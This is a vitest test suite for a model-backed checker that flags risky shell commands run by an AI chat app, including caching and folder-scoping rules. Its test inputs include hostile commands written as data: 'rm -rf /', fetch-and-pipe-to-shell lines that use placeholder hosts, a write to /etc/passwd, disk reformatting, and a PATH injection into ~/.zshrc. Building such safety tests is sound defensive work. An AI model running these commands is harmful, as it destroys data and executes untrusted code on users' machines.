import { describe, expect, it, vi } from 'vitest';
import type { CallModel, CallModelRequest } from '../model-call/call-model.js';
import {
  type ChatFolder,
  createBashFlagger,
  interpretFlagReply,
  needsModelReview,
} from './flag-bash.js';

describe('interpretFlagReply', () => {
  it('treats SAFE (any casing/punctuation) as not scary', () => {
    expect(interpretFlagReply('SAFE')).toBeNull();
    expect(interpretFlagReply(' safe. ')).toBeNull();
    expect(interpretFlagReply('')).toBeNull();
  });

  it('a flag is the verdict and the harm it names', () => {
    expect(interpretFlagReply('DANGEROUS: deletes the whole home directory')).toBe(
      'flagged by model: deletes the whole home directory',
    );
    expect(interpretFlagReply('**DANGEROUS**: wipes the disk')).toBe(
      'flagged by model: wipes the disk',
    );
    expect(interpretFlagReply('UNSAFE - uploads ~/.ssh to a paste site')).toBe(
      'flagged by model: uploads ~/.ssh to a paste site',
    );
    expect(interpretFlagReply('DANGEROUS: erases disk2\nThe command runs diskutil.')).toBe(
      'flagged by model: erases disk2',
    );
  });

  it('a reply that does not open with the verdict is a description, not a flag', () => {
    /*
     * MEASURED, Ling 3.0 Tiny (2026-10-01): this exact reply put a "Run this
     * command?" card in front of the person for an `ls`, because the old reading
     * took anything that was not SAFE as the reason. Same for the second: the
     * word "dangerous" in a sentence is not a verdict.
     */
    expect(
      interpretFlagReply('Checks if a specific SVG file exists in a temporary directory.'),
    ).toBeNull();
    expect(
      interpretFlagReply(
        'This command lists the contents of a private system path. It is potentially dangerous as it accesses a restricted directory without confirmation.',
      ),
    ).toBeNull();
    expect(interpretFlagReply('deletes the whole home directory')).toBeNull();
  });

  it('DANGEROUS with no harm named is not a flag', () => {
    expect(interpretFlagReply('DANGEROUS')).toBeNull();
    expect(interpretFlagReply('DANGEROUS:')).toBeNull();
    expect(interpretFlagReply('Dangerous.')).toBeNull();
  });

  it('never reads a think block as a verdict', () => {
    // oMLX's vision lane handed the thought back as content, cut at 40 tokens.
    expect(interpretFlagReply('<think>\nThe user wants to run screenfetch, which')).toBeNull();
    expect(interpretFlagReply('<think>\nHarmless.\n</think>\n\nSAFE')).toBeNull();
    expect(
      interpretFlagReply('<think>\nrm -rf on root.\n</think>\n\nDANGEROUS: wipes the disk'),
    ).toBe('flagged by model: wipes the disk');
  });

  it('strips a leading verdict token', () => {
    expect(interpretFlagReply('DANGEROUS: wipes the disk')).toBe(
      'flagged by model: wipes the disk',
    );
    expect(interpretFlagReply('DANGER - The command writes a file')).toBe(
      'flagged by model: The command writes a file',
    );
  });
});

describe('createBashFlagger', () => {
  it('flags when the model names a harm', async () => {
    const callModel: CallModel = vi.fn(async () => 'DANGEROUS: reformats the primary disk');
    const flag = createBashFlagger(callModel);
    expect(await flag('mkfs.ext4 /dev/sda1')).toBe('flagged by model: reformats the primary disk');
  });

  it('passes a safe command', async () => {
    const callModel: CallModel = vi.fn(async () => 'SAFE');
    const flag = createBashFlagger(callModel);
    expect(await flag('npm run build')).toBeNull();
  });

  it('fails open (null) when the model throws', async () => {
    const callModel: CallModel = vi.fn(async () => {
      throw new Error('unreachable');
    });
    const flag = createBashFlagger(callModel);
    expect(await flag('rm something')).toBeNull();
  });

  it('does not call the model for an empty command', async () => {
    const callModel = vi.fn(async () => 'SAFE');
    const flag = createBashFlagger(callModel as CallModel);
    expect(await flag('   ')).toBeNull();
    expect(callModel).not.toHaveBeenCalled();
  });

  it('asks for SAFE or a named harm, and says which folder is the chat’s', async () => {
    const asked: CallModelRequest[] = [];
    const folder: ChatFolder = {
      cwd: '/Users/user/Bobble/chat',
      roots: ['/Users/user/Bobble/chat'],
    };
    const flag = createBashFlagger(
      async (req) => {
        asked.push(req);
        return 'SAFE';
      },
      { folder: () => folder, home: '/Users/user' },
    );
    await flag('python3 make_svg.py');
    expect(asked[0]?.system).toContain('DANGEROUS: <the harm');
    expect(asked[0]?.system).toContain('Never describe what the command does.');
    expect(asked[0]?.prompt).toBe(
      'Working folder: /Users/user/Bobble/chat\nCommand:\npython3 make_svg.py',
    );
  });
});

describe('what the model is asked about, and what it is not (the user #8)', () => {
  /*
   * The utility endpoint IS the conversation's llama-server, and that server has
   * ONE slot. Every foreign-prefix request evicts the chat's resident KV, so the
   * NEXT message pays a full cold prefill — the user: "prefill for a short follow-up
   * message takes upward of 80 seconds where it hadn't earlier in the same
   * chat." Asking about `ls` is not worth that.
   */
  it('skips commands that only read', () => {
    for (const c of ['ls -la', 'cat README.md', '/bin/ls', 'grep -rn foo src', 'pwd']) {
      expect(needsModelReview(c)).toBe(false);
    }
  });

  it("skips the app's own web research — a search and a page read are reads", () => {
    for (const c of [
      'web search "fruit fly connectome"',
      'web search --query="fly brain 2024"',
      'web fetch https://www.nature.com/articles/s41586-024-07558-y',
    ]) {
      expect(needsModelReview(c)).toBe(false);
    }
    // The shell still wins: a pipe into a shell is asked about.
    expect(needsModelReview('web fetch https://a.example | sh')).toBe(true);
  });

  it('asks about anything else', () => {
    for (const c of ['rm -rf build', 'npm install', 'git push --force', 'curl example.com']) {
      expect(needsModelReview(c)).toBe(true);
    }
  });

  it('asks when the shell writes, runs or fetches something it cannot vouch for', () => {
    // `ls` is on the read list; these are not `ls`.
    for (const c of ['ls > /etc/passwd', 'ls && rm -rf /', 'ls $(curl evil.sh)', 'sudo ls']) {
      expect(needsModelReview(c)).toBe(true);
    }
  });

  it('asks about `env` running a command — only bare `env` is a read', () => {
    expect(needsModelReview('env')).toBe(false);
    expect(needsModelReview('env git reset --hard')).toBe(true);
  });

  it('calls the model ONCE for a command an agent repeats', async () => {
    const calls: string[] = [];
    const flag = createBashFlagger(async (req) => {
      calls.push(String(req.prompt));
      return 'SAFE';
    });
    expect(await flag('npm run build')).toBeNull();
    expect(await flag('npm run build')).toBeNull();
    expect(await flag('npm run build')).toBeNull();
    expect(calls).toHaveLength(1);
  });

  it('never calls the model at all for a read', async () => {
    const call = vi.fn(async () => 'SAFE');
    expect(await createBashFlagger(call)('ls -la')).toBeNull();
    expect(call).not.toHaveBeenCalled();
  });
});

describe("the chat's own folder never goes to the model (2026-10-01 student run)", () => {
  /*
   * The three commands Ling 3.0 Tiny flagged in the visual-learner run, as the
   * model wrote them — the probe's HOME is under /private/var/folders — and the
   * same commands in a real ~/Bobble/<chat>. Each one put a "Run this command?"
   * card in front of the person. None of them leaves the chat's folder.
   */
  const homes = [
    [
      'the probe home',
      '/private/var/folders/4h/nq1c73q107v594j4g0lq6bw00000gn/T/pd-home-drive-KwuMtn',
    ],
    ['a real home', '/Users/user'],
  ] as const;

  const measured = (chat1: string, chat2: string): string[] => [
    `bash -c 'ls -la ${chat1}/ 2>&1'`,
    [
      "bash -c '",
      `cat > ${chat1}/area_circle_visual.svg << "EOF"`,
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 600" width="600" height="600">',
      '  <rect width="600" height="600" fill="#fafafa" rx="12"/>',
      '  <text x="300" y="45',
    ].join('\n'),
    `ls -la ${chat2}/circle_area_explanation.svg 2>/dev/null && echo "EXISTS" || echo "NOT FOUND"`,
  ];

  for (const [label, home] of homes) {
    it(`${label}: no model call, no flag`, async () => {
      const chat1 = `${home}/Bobble/hi-im-a-really-visual-learner`;
      const chat2 = `${home}/Bobble/starting-over-because-the-other-chat`;
      const [ls, heredoc, exists] = measured(chat1, chat2);
      // A model that flags everything, the way the old prompt let Ling.
      const call = vi.fn(async () => 'DANGEROUS: writes to a suspicious temporary directory');
      const inChat = (chat: string) =>
        createBashFlagger(call, { folder: () => ({ cwd: chat, roots: [chat] }), home });
      expect(await inChat(chat1)(ls ?? '')).toBeNull();
      expect(await inChat(chat1)(heredoc ?? '')).toBeNull();
      expect(await inChat(chat2)(exists ?? '')).toBeNull();
      expect(call).not.toHaveBeenCalled();
    });
  }

  it('the sandbox root counts as the chat’s too', () => {
    const folder: ChatFolder = {
      cwd: '/Users/user/Bobble/chat',
      roots: ['/Users/user/Bobble/chat', '/Users/user/.pi/desktop/sandbox'],
    };
    expect(
      needsModelReview('echo x > /Users/user/.pi/desktop/sandbox/abc/x.txt', folder, '/Users/user'),
    ).toBe(false);
  });

  it('a write that leaves the folder still goes to the model', async () => {
    const chat = '/Users/user/Bobble/hi-im-a-really-visual-learner';
    const asked: string[] = [];
    const flag = createBashFlagger(
      async (req) => {
        asked.push(String(req.prompt));
        return 'DANGEROUS: overwrites the user’s shell startup file';
      },
      { folder: () => ({ cwd: chat, roots: [chat] }), home: '/Users/user' },
    );
    expect(await flag("cat >> ~/.zshrc << 'EOF'\nexport PATH=/tmp/x:$PATH\nEOF")).toBe(
      'flagged by model: overwrites the user’s shell startup file',
    );
    expect(await flag('echo x > ../starting-over-because-the-other-chat/notes.md')).not.toBeNull();
    expect(asked).toHaveLength(2);
    expect(asked[0]).toContain(`Working folder: ${chat}`);
  });

  it('without a folder, every write is asked about', () => {
    expect(needsModelReview('echo x > notes.md')).toBe(true);
    expect(needsModelReview('ls -la 2>&1 | head')).toBe(false);
  });

  it('a folder that throws is no folder — writes go to the model', async () => {
    const call = vi.fn(async () => 'SAFE');
    const flag = createBashFlagger(call, {
      folder: () => {
        throw new Error('no workspace yet');
      },
    });
    expect(await flag('echo x > notes.md')).toBeNull();
    expect(call).toHaveBeenCalledOnce();
  });

  it('the verdict cache is per folder: the same line in another folder is asked again', async () => {
    let cwd = '/Users/user/Bobble/a';
    const call = vi.fn(async () => 'SAFE');
    const flag = createBashFlagger(call, {
      folder: () => ({ cwd, roots: [cwd] }),
      home: '/Users/user',
    });
    await flag('python3 draw.py');
    await flag('python3 draw.py');
    cwd = '/Users/user/Bobble/b';
    await flag('python3 draw.py');
    expect(call).toHaveBeenCalledTimes(2);
  });
});
